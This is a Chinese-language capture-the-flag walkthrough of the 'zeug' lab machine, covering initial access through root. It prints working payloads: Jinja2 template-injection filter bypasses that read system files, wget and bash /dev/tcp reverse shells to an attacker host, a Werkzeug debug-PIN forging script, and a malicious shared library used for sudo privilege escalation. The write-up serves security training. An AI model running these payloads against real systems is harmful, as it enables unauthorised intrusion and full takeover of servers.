# zeug

> 导入靶场时，建议使用为所有网卡重新生成MAC地址。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826200.png" alt="image-20240328135716613" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sCV 10.0.2.13
```

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.11.2
|     Date: Thu, 28 Mar 2024 05:58:16 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 549
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Zeug</title>
|     <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
|     </head>
|     <body>
|     <h1>Zeug</h1>
|     <h3>Rendering HTML templates</h3>
|     <form action="/" method="post" enctype="multipart/form-data">
|     <input type="file" name="file" accept=".html" title="Select file" required>
|     <input type="submit" value="Upload">
|     </form>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.11.2
|     Date: Thu, 28 Mar 2024 05:58:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, POST, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/28%Time=660506F8%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,2D3,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\
SF:x20Python/3\.11\.2\r\nDate:\x20Thu,\x2028\x20Mar\x202024\x2005:58:16\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20549\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lan
SF:g=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x2
SF:0\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x2
SF:0initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Zeug</title>\n\x20\x20\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href=\"/stati
SF:c/styles/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20<h1>Zeug</h1>
SF:\n\x20\x20\x20\x20<h3>Rendering\x20HTML\x20templates</h3>\n\n\x20\x20\x
SF:20\x20<form\x20action=\"/\"\x20method=\"post\"\x20enctype=\"multipart/f
SF:orm-data\">\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"file\"\x2
SF:0name=\"file\"\x20accept=\"\.html\"\x20title=\"Select\x20file\"\x20requ
SF:ired>\n\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\"submit\"\x20val
SF:ue=\"Upload\">\n\x20\x20\x20\x20</form>\n\n\x20\x20\x20\x20\n\n\x20\x20
SF:\x20\x20\n</body>\n</html>")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<ht
SF:ml\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
SF:anation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x
SF:20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,CD,"
SF:HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\x20Python/3\.11\.
SF:2\r\nDate:\x20Thu,\x2028\x20Mar\x202024\x2005:58:31\x20GMT\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20PO
SF:ST,\x20HEAD\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Unix
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826204.png" alt="image-20240328140322970" style="zoom:33%;" />



## 漏洞挖掘

### 尝试连接ftp

```bash
┌──(kali💀kali)-[~]
└─$ ftp 10.0.2.13
Connected to 10.0.2.13.
220 (vsFTPd 3.0.3)
Name (10.0.2.13:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52547|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt
226 Directory send OK.
ftp> get README.txt
local: README.txt remote: README.txt
229 Entering Extended Passive Mode (|||48843|)
150 Opening BINARY mode data connection for README.txt (109 bytes).
100% |**************************************************************************|   109        2.72 KiB/s    00:00 ETA
226 Transfer complete.
109 bytes received in 00:00 (2.67 KiB/s)
```

`README.txt`内容为：

```text
Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
```

### 查看页面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zeug</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
    <h1>Zeug</h1>
    <h3>Rendering HTML templates</h3>
    <form action="/" method="post" enctype="multipart/form-data">
        <input type="file" name="file" accept=".html" title="Select file" required>
        <input type="submit" value="Upload">
    </form>
</body>
</html>
```

### SSTI 模板注入

尝试模板注入，传一个简单的html上去：

```html
<!DOCTYPE html>
<html>
    <head>
        HelloWorld!
    </head>
    <body>
        {{9*9}}
    </body>
</html>
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826205.png" alt="image-20240328141531197" style="zoom: 33%;" />

看来真的存在模板注入了！

> https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#jinja2-debug-statement

```python
{{os.system('whoami')}}
```

```text
Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: os
```

```python
{{ [].class.base.subclasses() }}
```

```text
Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: subclasses, [, ]
```

```python
{{ self.__init__.__globals__.__builtins__ }}
```

```text
Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: init
```

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826206.png" alt="image-20240328153310165" style="zoom: 50%;" />

发现两个用户`cosette`和`exia`.

### 方法一：模板注入

先查看一下内置函数：

```python
{{lipsum.__globals__.__builtins__}}
```

```text
<html> <head> HelloWorld! </head> <body> {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.} </body> </html>
```

查看一下用户名：

```python
{{lipsum.__globals__.__builtins__.eval("__im""port__('o''s').pop""en('whoami').read()")}}
```

```text
<html> <head> HelloWorld! </head> <body> cosette </body> </html>
```

尝试上传一个反弹shell：

```python
{{lipsum.__globals__.__builtins__.eval("__im""port__('o''s').pop""en('wget http://10.0.2.4:8888/rev.sh').read()")}}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826207.png" alt="image-20240328160430291" style="zoom:50%;" />

执行一下：

```bash
{{lipsum.__globals__.__builtins__.eval("__im""port__('o''s').pop""en('bash rev.sh').read()")}}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826208.png" alt="image-20240328160917535" style="zoom:50%;" />

拿到shell了！

### 方法二：破解PIN

这里我因为有事情断开了，重启以后改用桥接方便在本机上操作了，不影响任何东西。

因为`debug`开启了，所以我们可以访问`console`，但是需要 pin 码。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826209.png" alt="image-20240328155306443" style="zoom: 33%;" />

这个pin存在漏洞可以获取：https://github.com/wdahlenburg/werkzeug-debug-console-bypass

```python
# get_pin.py
import hashlib
from itertools import chain

probably_public_bits = [
    'user',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'
]

private_bits = [
    '279275995014060',
    'd4e6cb65d59544f3331ea0425dc555a1'
]

h = hashlib.sha1() # or hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

我们需要修改四个地方：

```python
probably_public_bits = [
    'user',															# 1
    'flask.app',													
    'Flask',														
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'			# 2
]

private_bits = [
    '279275995014060',										 		# 3 
    'd4e6cb65d59544f3331ea0425dc555a1'								# 4
]
```

#### 用户名信息

前面有一个报错：

```text
Error: File: /home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py - Template contains restricted words: init
```

所以很明显，用户名为：`cosette`

#### app.py 地址信息

`/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py`

#### MAC地址信息

#3 的内容需要的是mac地址信息：我的是`08:00:27:25:b4:6c`，使用python转换一下进制即可：

```python
┌──(kali💀kali)-[~/temp]
└─$ python3                 
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x08002725b46c)   # 将冒号去掉最前面加上0x即可
8796749804652
```

#### Machine ID

正常情况可以使用脚本获取：

```python
machine_id = b""
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open("/proc/self/cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

print(machine_id)
```

但是我们这边是上传，尝试一下构造payload获取：

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/machine-id").read() }}
# <html> <head> HelloWorld! </head> <body> 48329e233f524ec291cce7479927890b </body> </html>
{{ get_flashed_messages.__globals__.__builtins__.open("/proc/sys/kernel/random/boot_id").read() }}
# <html> <head> HelloWorld! </head> <body> 3f935d08-760e-4f78-aa51-e59eac98390a </body> </html>
{{ get_flashed_messages.__globals__.__builtins__.open("/proc/self/cgroup").read() }}
# <html> <head> HelloWorld! </head> <body> 0::/system.slice/zeug-app.service </body> </html>
```

创建文件，放入我们搜集到的信息，更改一下脚本，然后运行：

```python
machine_id = b""
for filename in "machine-id", "boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open("cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

print(machine_id)
```

运行结果：

```bash
┌──(kali💀kali)-[~/temp]
└─$ echo "48329e233f524ec291cce7479927890b" > machine-id
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ echo "3f935d08-760e-4f78-aa51-e59eac98390a" > boot_id
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ echo "0::/system.slice/zeug-app.service" > cgroup    
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ vim mi.py    
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ chmod +x mi.py  
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ python3 mi.py           
b'48329e233f524ec291cce7479927890bzeug-app.service'
```

#### 更改整体脚本

```python
# get_pin.py
import hashlib
from itertools import chain

probably_public_bits = [
    'cosette',
    'flask.app',
    'Flask',
    '/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py'
]

private_bits = [
    '8796749804652',
    '48329e233f524ec291cce7479927890bzeug-app.service'
]

h = hashlib.sha1() # or hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

运行得到 pin 码：

```bash
┌──(kali💀kali)-[~/temp]
└─$ vim get-pin.py
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ chmod +x get-pin.py 
                                                                                                                       
┌──(kali💀kali)-[~/temp]
└─$ python3 get-pin.py 
367-506-961
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826210.png" alt="image-20240328165626788" style="zoom:33%;" />

不知道哪里出错了。。。。删除机器，重新导入机器并为机器所有网卡重新赋予MAC地址。

再次尝试：

![image-20240328172650120](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826211.png)

成功！

### Console RCE

```python
__import__('os').popen('whoami').read();
__import__('os').system("bash -i >& /dev/tcp/172.20.10.8/1234 0>&1")
__import__('os').system('bash -c "bash -i >& /dev/tcp/172.20.10.8/1234 0>&1"')
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826212.png" alt="image-20240328173404084" style="zoom:50%;" />

## 提权

### 信息搜集

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826214.png" alt="image-20240328174036683" style="zoom:50%;" />

### 查看seed_back

```bash
file seed_bak     
seed_bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=403ea35a235b0a4c74f7977580b4ef46fcd0f044, for GNU/Linux 4.4.0, not stripped
```

丢进`ida`看一下：

```c
// main.c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h]
  int v5; // [rsp+10h] [rbp-10h]
  int v6; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  banner(*(_QWORD *)&argc, argv, envp);
  srand(1u);
  v5 = rand();
  v6 = -559038737;
  v4 = 0;
  printf("Enter a number: ");
  __isoc99_scanf("%d", &v4);
  if ( v6 == (v5 ^ v4) )
    system("/bin/bash");
  else
    puts("Wrong.");
  return 0;
}
```

### 伪随机数+切换exia用户

是一个伪随机数，写一个脚本利用一下：

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    srand(1u);
    int v5 = rand();
    int v6 = -559038737;
    printf("%d\n", v5 ^ v6);
    return 0;
}
// -1255736440
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826215.png" alt="image-20240328180730702" style="zoom:50%;" />

### 二次提权

#### 信息搜集

```bash
exia@zeug:/home/cosette$ cd /home/exia
exia@zeug:~$ ls -la
total 44
drwx------ 3 exia exia  4096 Jan  6 23:23 .
drwxr-xr-x 4 root root  4096 Jan  6 19:28 ..
lrwxrwxrwx 1 exia exia     9 Jan  6 23:23 .bash_history -> /dev/null
-rwx------ 1 exia exia   220 Apr 23  2023 .bash_logout
-rwx------ 1 exia exia  3526 Apr 23  2023 .bashrc
drwx------ 3 exia exia  4096 Jan  6 21:46 .local
-rwx------ 1 exia exia   807 Apr 23  2023 .profile
-rwx------ 1 exia exia 15744 Jan  6 21:59 seed
-rwx------ 1 exia exia    38 Jan  6 22:14 user.txt
exia@zeug:~$ cat user.txt
HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}
exia@zeug:~$ sudo -l
Matching Defaults entries for exia on zeug:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User exia may run the following commands on zeug:
    (root) NOPASSWD: /usr/bin/zeug
```

#### 反编译zeug

```c
// main.c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  if ( dlopen("/home/exia/exia.so", 2) )
    return 0;
  fwrite("Error opening file\n", 1uLL, 0x13uLL, _bss_start);
  return 1;
}
```

它运行了`/home/exia.so`目录下的链接库文件，尝试进行[劫持利用](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-privilege-escalation-by-overriding-shared-library/)：

```c
// exia.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

然后编译为链接库文件：

```bash
gcc  -fPIC -shared -o exia.so exia.c
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826216.png" alt="image-20240328182210680" style="zoom:50%;" />

传过去，运行获得root！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403281826217.png" alt="image-20240328182504876" style="zoom:50%;" />

#### 寻找flag

```text
exia@zeug:~$ sudo /usr/bin/zeug
root@zeug:/home/exia# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@zeug:/home/exia# cd /root
root@zeug:~# ls -la
total 32
drwx------  4 root root 4096 Jan  6 23:52 .
drwxr-xr-x 18 root root 4096 Jan  6 13:28 ..
lrwxrwxrwx  1 root root    9 Jan  6 23:20 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-------  1 root root   20 Jan  6 22:40 .lesshst
drwxr-xr-x  3 root root 4096 Jan  6 13:52 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root    0 Jan  6 15:13 .python_history
-rw-r--r--  1 root root   38 Jan  6 23:06 root.txt
drwx------  2 root root 4096 Jan  6 23:52 .ssh
root@zeug:~# cat root.txt 
HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
```

## 参考blog

https://www.cnblogs.com/bmjoker/p/13508538.html

https://moonsec.top/articles/108

https://hackmanit.de/en/blog-en/178-template-injection-vulnerabilities-understand-detect-identify

https://wiki.wgpsec.org/knowledge/ctf/SSTI.html